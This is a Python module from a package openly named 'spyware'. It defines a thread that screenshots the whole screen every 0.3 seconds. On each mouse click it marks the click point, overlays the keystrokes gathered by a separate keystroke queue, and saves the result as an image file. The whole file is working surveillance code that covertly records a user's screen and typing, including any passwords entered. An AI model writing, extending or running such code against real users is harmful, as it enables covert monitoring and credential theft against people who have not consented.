import queue
from pathlib import Path
from threading import Thread
from time import sleep

from PIL import ImageGrab, ImageDraw, ImageFont

from spyware.queues import click_queue, keystroke_queue


class ScreenshotThread(Thread):
    def __init__(self):
        super().__init__()
        self._buffer = []
        self.action_counter = 0

    @staticmethod
    def draw_circle(image, position):
        draw = ImageDraw.Draw(image)
        draw.ellipse((position[0] - 20, position[1] - 20, position[0] + 20, position[1] + 20), outline="red", width=3)

    @staticmethod
    def draw_keystrokes(image):
        def collect_keystrokes():
            keystrokes = []
            while True:
                try:
                    keystrokes.append(str(keystroke_queue.get(block=False)).strip("'"))
                except queue.Empty:
                    return keystrokes

        draw = ImageDraw.Draw(image)
        text = "  ".join(collect_keystrokes())

        position = (30, 30)
        left, top, right, bottom = draw.textbbox(position, text, font_size=30)
        draw.rectangle((left - 10, top - 10, right + 10, bottom + 10), fill="black")
        draw.text(position, text, font_size=30, fill="red")

    def handle_click(self, position):
        self.action_counter += 1
        screenshot = self._buffer[-1]

        self.draw_circle(screenshot, position)
        self.draw_keystrokes(screenshot)

        screenshot.save(Path(__file__).parent.parent / "data" / f"screenshot-{self.action_counter}.png")

    def run(self):
        while True:
            self._buffer.append(ImageGrab.grab((0, 0, 1920, 1080)))

            try:
                position = click_queue.get(block=False)
                self.handle_click(position)
                continue
            except queue.Empty:
                pass
            sleep(0.3)

